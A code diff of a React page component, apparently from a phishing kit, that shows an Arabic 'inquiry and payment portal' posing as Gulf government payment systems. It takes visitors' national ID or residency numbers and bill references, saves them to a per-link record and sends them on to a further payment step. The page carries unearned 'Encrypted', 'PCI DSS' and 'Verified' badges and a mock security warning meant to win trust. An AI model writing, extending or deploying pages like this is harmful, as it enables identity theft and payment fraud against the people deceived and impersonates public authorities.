@@ -4,403 +4,177 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { getCountryByCode } from "@/lib/countries";
-import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
-import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
-import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Building2 } from "lucide-react";
-import BrandedTopBar from "@/components/BrandedTopBar";
-import BrandedCarousel from "@/components/BrandedCarousel";
+import {
+  FileText,
+  Loader2,
+  ShieldCheck,
+  ArrowLeft,
+  Lock,
+  Landmark,
+  Info,
+  CheckCircle,
+  AlertCircle
+} from "lucide-react";
+import { useToast } from "@/hooks/use-toast";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import { shippingCompanyBranding } from "@/lib/brandingSystem";
-import PageLoader from "@/components/PageLoader";
+import { formatCurrency } from "@/lib/countryCurrencies";
+import BackButton from "@/components/BackButton";
+import BottomNav from "@/components/BottomNav";
 
 const PaymentData = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading, isError } = useLink(id);
-  const [showPage, setShowPage] = useState(false);
-
-  useEffect(() => {
-    const timer = setTimeout(() => {
-      setShowPage(true);
-    }, 3000);
-    return () => clearTimeout(timer);
-  }, []);
-
-  useEffect(() => {
-    if (linkData || isError) {
-      setShowPage(true);
-    }
-  }, [linkData, isError]);
+  const { toast } = useToast();
+  const { data: link, isLoading } = useLink(id);
   const updateLink = useUpdateLink();
+
+  const [reference, setReference] = useState("");
+  const [nationalId, setNationalId] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const [customerName, setCustomerName] = useState("");
-  const [customerEmail, setCustomerEmail] = useState("");
-  const [customerPhone, setCustomerPhone] = useState("");
-  const [invoiceNumber, setInvoiceNumber] = useState("");
-  const [selectedService, setSelectedService] = useState("");
-  const [paymentAmount, setPaymentAmount] = useState("");
-
-  const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || linkData?.payload?.customerInfo?.service || 'government_payment';
-  const countryParam = urlParams.get('country');
-  const amountParam = urlParams.get('amount');
-
-  const serviceName = "دفع فاتورة";
-  const paymentInfo = linkData?.payload as any;
-  
-  // أولوية للـ query parameters
-  const countryCode = countryParam || paymentInfo?.selectedCountry || "SA";
+  const countryCode = link?.country_code || "SA";
   const govSystem = getGovernmentPaymentSystem(countryCode);
-  const branding = getServiceBranding(serviceKey);
-  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
 
-  // Get country data
-  const countryData = getCountryByCode(countryCode);
-  const phoneCode = countryData?.phoneCode || "+966";
-  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
-
-  // Get government services for the country
-  const governmentServices = useMemo(
-    () => getGovernmentServicesByCountry(countryCode),
-    [countryCode]
-  );
-
-  // Get selected government service details
-  const selectedServiceData = useMemo(
-    () => governmentServices.find(s => s.key === selectedService),
-    [governmentServices, selectedService]
-  );
-
-  // Get amount from link data
-  const rawAmount = paymentInfo?.payment_amount;
-  let amount = 500;
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
+  useEffect(() => {
+    if (link?.payload?.reference) {
+      setReference(link.payload.reference);
     }
-  }
+  }, [link]);
 
-  // Set initial payment amount from link data
-  useState(() => {
-    if (amount && !paymentAmount) {
-      setPaymentAmount(amount.toString());
-    }
-  });
-
-  // Calculate formatted amount dynamically based on input
-  const displayAmount = paymentAmount ? parseFloat(paymentAmount) : amount;
-  const formattedAmount = formatCurrency(displayAmount, countryCode);
-
-  if (isLoading && !showPage) {
-    return <PageLoader message="جاري تحميل بيانات الفاتورة..." />;
-  }
-
-  const handleProceed = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!reference || !nationalId) {
+      toast({ title: "تنبيه", description: "يرجى تعبئة كافة الحقول المطلوبة للمتابعة", variant: "destructive" });
+      return;
+    }
 
-    if (isSubmitting) return;
     setIsSubmitting(true);
-
-    // Update link with payment data
     try {
-      if (linkData) {
-        const updatedData = {
-          ...linkData.payload,
-          payment_data: {
-            customer_name: customerName,
-            customer_email: customerEmail,
-            customer_phone: customerPhone,
-            invoice_number: invoiceNumber,
-            selected_service: selectedService,
-            selected_service_name: selectedServiceData?.nameAr || selectedService,
-            payment_amount: parseFloat(paymentAmount) || amount,
-            currency_code: getCurrencyCode(countryCode),
-          },
-          selectedCountry: countryCode,
-          service_key: serviceKey,
-          service_name: serviceName
-        };
+      await updateLink.mutateAsync({
+        linkId: id!,
+        payload: { ...link?.payload, reference, nationalId }
+      });
 
-        try {
-          await updateLink.mutateAsync({
-            linkId: id!,
-            payload: updatedData,
-          });
-        } catch (error) {
-          console.error('Update link error:', error);
-        }
-      }
-
-      // Navigate to payment details with params
-      const finalAmount = parseFloat(paymentAmount) || amount;
-      const nextUrl = `/pay/${id}/details?company=${serviceKey}&currency=${getCurrencyCode(countryCode)}&amount=${finalAmount}`;
-      navigate(nextUrl);
-    } catch (error) {
-      console.error('Payment data error:', error);
+      navigate(`/pay/${id}/recipient`);
+    } catch (err) {
+      console.error(err);
     } finally {
       setIsSubmitting(false);
     }
   };
 
-  return (
-    <>
-      <PaymentMetaTags
-        serviceName={serviceName}
-        serviceKey={serviceKey}
-        amount={formatCurrency(amount, countryCode)}
-        title="دفع فاتورة - إكمال البيانات"
-        description="قم بإكمال بيانات السداد لدفع الفاتورة"
-      />
-      
-      <BrandedTopBar 
-        serviceKey={serviceKey}
-        serviceName={govSystem.nameAr || serviceName}
-        showBackButton={true}
-        countryCode={countryCode}
-        showCarousel={false}
-      />
-
-      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
-
-      <div 
-        className="min-h-screen py-6 sm:py-8" 
-        dir="rtl"
-        style={{
-          background: `linear-gradient(135deg, ${companyBranding?.colors.background || govSystem.colors.surface}, ${companyBranding?.colors.surface || '#ffffff'})`,
-          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-        }}
-      >
-        <div className="container mx-auto px-3 sm:px-4">
-          <div className="max-w-2xl mx-auto">
-            <Card 
-              className="p-4 sm:p-8 shadow-2xl border-t-4" 
-              style={{ 
-                borderTopColor: branding.colors.primary,
-                boxShadow: companyBranding?.shadows.xl || '0 20px 60px -15px rgba(0, 0, 0, 0.3)',
-                borderRadius: companyBranding?.borderRadius.lg || '16px'
-              }}
-            >
-              <form onSubmit={handleProceed}>
-                <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 
-                    className="text-xl sm:text-3xl font-bold" 
-                    style={{ 
-                      color: companyBranding?.colors.text || govSystem.colors.text,
-                      fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                    }}
-                  >
-                    إكمال بيانات السداد
-                  </h1>
-
-                  <div
-                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
-                    style={{
-                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-                      boxShadow: companyBranding?.shadows.lg || '0 10px 40px -10px rgba(0,0,0,0.3)'
-                    }}
-                  >
-                    <Building2 className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
-                  </div>
-                </div>
-
-                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-                  <div>
-                    <Label 
-                      htmlFor="name" 
-                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
-                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
-                    >
-                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
-                      الاسم الكامل *
-                    </Label>
-                    <Input
-                      id="name"
-                      value={customerName}
-                      onChange={(e) => setCustomerName(e.target.value)}
-                      required
-                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
-                      placeholder="أدخل اسمك الكامل"
-                      style={{
-                        borderColor: companyBranding?.colors.border || '#e5e7eb',
-                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                      }}
-                    />
-                  </div>
-
-                  <div>
-                    <Label 
-                      htmlFor="email" 
-                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
-                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
-                    >
-                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
-                      البريد الإلكتروني *
-                    </Label>
-                    <Input
-                      id="email"
-                      type="email"
-                      value={customerEmail}
-                      onChange={(e) => setCustomerEmail(e.target.value)}
-                      required
-                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
-                      placeholder="example@email.com"
-                      style={{
-                        borderColor: companyBranding?.colors.border || '#e5e7eb',
-                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                      }}
-                    />
-                  </div>
-
-                  <div>
-                    <Label 
-                      htmlFor="phone" 
-                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
-                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
-                    >
-                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
-                      رقم الهاتف *
-                    </Label>
-                    <Input
-                      id="phone"
-                      type="tel"
-                      value={customerPhone}
-                      onChange={(e) => setCustomerPhone(e.target.value)}
-                      required
-                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
-                      placeholder={`${phoneCode} ${phonePlaceholder}`}
-                      style={{
-                        borderColor: companyBranding?.colors.border || '#e5e7eb',
-                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                      }}
-                    />
-                  </div>
-
-                  <div>
-                    <Label 
-                      htmlFor="invoice" 
-                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
-                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
-                    >
-                      <Hash className="w-3 h-3 sm:w-4 sm:h-4" />
-                      الرقم المفوتر *
-                    </Label>
-                    <Input
-                      id="invoice"
-                      value={invoiceNumber}
-                      onChange={(e) => setInvoiceNumber(e.target.value)}
-                      required
-                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
-                      placeholder="مثال: INV-12345"
-                      style={{
-                        borderColor: companyBranding?.colors.border || '#e5e7eb',
-                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                      }}
-                    />
-                  </div>
-
-                  <div>
-                    <Label 
-                      className="mb-2 text-sm font-bold"
-                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
-                    >
-                      الخدمة الحكومية/العامة *
-                    </Label>
-                    <Select value={selectedService} onValueChange={setSelectedService}>
-                      <SelectTrigger 
-                        className="h-10 sm:h-12 border-2 focus:border-primary transition-all"
-                        style={{
-                          borderColor: companyBranding?.colors.border || '#e5e7eb',
-                          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                        }}
-                      >
-                        <SelectValue placeholder="اختر الخدمة" />
-                      </SelectTrigger>
-                      <SelectContent className="bg-background z-50">
-                        {governmentServices.map((service) => (
-                          <SelectItem key={service.id} value={service.key}>
-                            {service.nameAr}
-                          </SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                    {selectedServiceData && (
-                      <p className="text-xs text-muted-foreground mt-1">
-                        {selectedServiceData.description}
-                      </p>
-                    )}
-                  </div>
-
-                  <div>
-                    <Label 
-                      htmlFor="amount" 
-                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
-                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
-                    >
-                      <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
-                      مبلغ السداد *
-                    </Label>
-                    <Input
-                      id="amount"
-                      type="number"
-                      value={paymentAmount}
-                      onChange={(e) => setPaymentAmount(e.target.value)}
-                      required
-                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
-                      placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
-                      step="0.01"
-                      min="0"
-                      style={{
-                        borderColor: companyBranding?.colors.border || '#e5e7eb',
-                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                      }}
-                    />
-                    <p className="text-xs text-muted-foreground mt-1">
-                      المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
-                    </p>
-                  </div>
-                </div>
-
-                <Button
-                  type="submit"
-                  size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-2xl hover:shadow-3xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
-                  style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-                    boxShadow: companyBranding?.shadows.xl || `0 20px 60px -15px ${branding.colors.primary}90`,
-                    fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                  }}
-                  disabled={isSubmitting || !customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
-                >
-                  {isSubmitting ? (
-                    <span>جاري المعالجة...</span>
-                  ) : (
-                    <>
-                      <span className="ml-2">التالي</span>
-                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-                    </>
-                  )}
-                </Button>
-
-                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-                  بالمتابعة، أنت توافق على الشروط والأحكام
-                </p>
-              </form>
-            </Card>
-          </div>
-        </div>
+  if (isLoading || !link) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-50">
+        <Loader2 className="w-10 h-10 animate-spin" style={{ color: govSystem.colors.primary }} />
       </div>
-    </>
+    );
+  }
+
+  return (
+    <div className="min-h-screen bg-gray-50 pb-20" dir="rtl" style={{ fontFamily: govSystem.fonts.primaryAr }}>
+      {/* Official Government Header */}
+      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50">
+        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
+          <div className="flex items-center gap-4">
+             <BackButton />
+             <div className="w-12 h-12 rounded-xl flex items-center justify-center text-white shadow-lg shadow-gray-200" style={{ background: govSystem.colors.primary }}>
+                <Landmark className="w-6 h-6" />
+             </div>
+             <div>
+                <h1 className="text-xl font-black text-gray-800">بوابة الاستعلام والسداد</h1>
+                <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{govSystem.nameEn} INTEGRATED SYSTEM</p>
+             </div>
+          </div>
+          {govSystem.logo && <img src={govSystem.logo} className="h-10 w-auto object-contain" alt="" />}
+        </div>
+      </header>
+
+      <div className="container mx-auto px-4 py-12">
+         <div className="max-w-2xl mx-auto space-y-10">
+            <div className="text-center space-y-2">
+               <h2 className="text-3xl font-black text-gray-800">الاستعلام عن المستحقات</h2>
+               <p className="text-gray-500 font-bold text-lg">يرجى إدخال بيانات الهوية ومرجع الخدمة للتحقق</p>
+            </div>
+
+            <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white relative overflow-hidden">
+               <div className="absolute top-0 right-0 w-32 h-32 opacity-[0.03] -mr-16 -mt-16 rounded-full" style={{ background: govSystem.colors.primary }} />
+
+               <form onSubmit={handleSubmit} className="space-y-8 relative z-10">
+                  <div className="space-y-6">
+                     <div className="space-y-2">
+                        <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">رقم الهوية الوطنية / الإقامة</Label>
+                        <Input
+                          value={nationalId}
+                          onChange={(e) => setNationalId(e.target.value)}
+                          className="h-16 border-2 rounded-2xl font-black text-2xl text-center bg-gray-50 focus:bg-white transition-all tracking-[0.2em]"
+                          placeholder="XXXXXXXXXX"
+                          maxLength={10}
+                          required
+                        />
+                     </div>
+
+                     <div className="space-y-2">
+                        <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">رقم الفاتورة / المرجع</Label>
+                        <div className="relative group">
+                           <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
+                           <Input
+                             value={reference}
+                             onChange={(e) => setReference(e.target.value)}
+                             className="h-16 pr-14 border-2 rounded-2xl font-black text-xl bg-gray-50 focus:bg-white transition-all"
+                             placeholder="أدخل الرقم المرجعي للخدمة"
+                             required
+                           />
+                        </div>
+                     </div>
+                  </div>
+
+                  <div className="bg-blue-50 p-6 rounded-3xl border border-blue-100 space-y-4">
+                     <div className="flex items-center gap-3">
+                        <Info className="w-5 h-5 text-blue-600" />
+                        <p className="text-sm font-black text-blue-800">معلومات الفاتورة</p>
+                     </div>
+                     <div className="flex justify-between items-center text-sm font-bold">
+                        <span className="text-blue-600/70">المبلغ المستحق:</span>
+                        <span className="text-2xl font-black text-blue-800">{formatCurrency(link.payload.payment_amount, link.payload.currency_code)}</span>
+                     </div>
+                  </div>
+
+                  <Button
+                    type="submit"
+                    disabled={isSubmitting}
+                    className="w-full h-20 rounded-[1.5rem] text-2xl font-black shadow-2xl transition-all hover:translate-y-[-4px] active:translate-y-[2px]"
+                    style={{ background: govSystem.gradients.primary, boxShadow: `0 15px 40px -12px ${govSystem.colors.primary}50` }}
+                  >
+                    {isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "تحقق ومتابعة السداد"}
+                  </Button>
+
+                  <div className="flex items-center justify-center gap-4 text-[10px] font-black text-gray-400 uppercase">
+                     <div className="flex items-center gap-1"><Lock className="w-3 h-3" /> Encrypted</div>
+                     <div className="w-1 h-1 rounded-full bg-gray-300" />
+                     <div className="flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> PCI DSS</div>
+                     <div className="w-1 h-1 rounded-full bg-gray-300" />
+                     <div className="flex items-center gap-1"><CheckCircle className="w-3 h-3" /> Verified</div>
+                  </div>
+               </form>
+            </Card>
+
+            <div className="p-8 bg-[#1E293B] rounded-[2.5rem] text-white flex items-center gap-8 shadow-xl">
+               <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center shrink-0 border border-white/20">
+                  <AlertCircle className="w-8 h-8 text-amber-400" />
+               </div>
+               <div>
+                  <h4 className="text-lg font-black mb-1">تعليمات الأمن السيبراني</h4>
+                  <p className="text-xs opacity-60 font-bold leading-relaxed">
+                     تأكد دائماً من وجود علامة القفل في شريط العنوان. لا تشارك بياناتك البنكية مع أي روابط غير رسمية. هذه البوابة مشفرة بمعيار 256-bit.
+                  </p>
+               </div>
+            </div>
+         </div>
+      </div>
+      <BottomNav />
+    </div>
   );
 };
 
